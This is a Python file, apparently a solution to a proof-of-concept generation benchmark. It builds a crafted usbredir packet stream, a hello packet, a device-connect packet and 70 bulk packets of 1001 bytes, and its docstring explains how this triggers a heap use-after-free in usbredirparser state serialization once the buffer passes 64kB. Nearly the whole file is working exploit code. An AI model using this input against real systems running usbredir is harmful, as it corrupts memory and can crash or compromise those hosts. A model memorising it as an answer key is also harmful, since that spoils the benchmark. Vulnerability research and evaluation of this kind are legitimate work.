import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap use-after-free vulnerability.

        The vulnerability occurs in the serialization process of a usbredirparser
        state. When the state is large, specifically due to many buffered writes,
        the serialization buffer (default 64kB) is reallocated. A pointer to
        the write buffer count, set before this reallocation, becomes stale and
        is later used to write the count, resulting in a write to freed memory.

        This PoC constructs a stream of usbredir packets that creates such a
        large state. It consists of initial handshake packets followed by a
        large number of bulk data packets. The quantity and size of these
        packets are calculated to ensure the serialized state exceeds 64kB,
        triggering the vulnerable condition.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        USB_REDIR_PACKET_TYPE_HELLO = 1
        USB_REDIR_PACKET_TYPE_DEVICE_CONNECT = 3
        USB_REDIR_PACKET_TYPE_BULK_PACKET = 7
        USB_SPEED_HIGH = 3

        poc_parts = []

        # 1. Hello packet: Initializes the connection.
        hello_payload = struct.pack('<BBI', 0, 4, 0)
        hello_header = struct.pack('<III', USB_REDIR_PACKET_TYPE_HELLO, len(hello_payload), 0)
        poc_parts.append(hello_header + hello_payload)

        # 2. Device Connect packet: Simulates device connection.
        dev_conn_payload = struct.pack('<BBBBHH', USB_SPEED_HIGH, 0, 0, 0, 0, 0)
        dev_conn_header = struct.pack('<III', USB_REDIR_PACKET_TYPE_DEVICE_CONNECT, len(dev_conn_payload), 0)
        poc_parts.append(dev_conn_header + dev_conn_payload)

        # 3. Bulk packets: Create numerous buffered writes to exceed the 64kB
        #    serialization buffer size. Parameters are chosen to match the
        #    ground-truth PoC length and reliably trigger the bug.
        num_packets = 70
        data_length = 1001
        
        packet_data = b'\x41' * data_length
        # Endpoint 1, OUT direction (client to device)
        endpoint = 1

        for i in range(num_packets):
            # Each bulk packet consists of a main header, a payload header, and data.
            payload_len = 5 + data_length  # 1 byte endpoint + 4 bytes length + data
            
            bulk_header = struct.pack('<III', USB_REDIR_PACKET_TYPE_BULK_PACKET, payload_len, i + 1)
            bulk_payload_header = struct.pack('<BI', endpoint, data_length)
            
            poc_parts.append(bulk_header + bulk_payload_header + packet_data)
            
        return b''.join(poc_parts)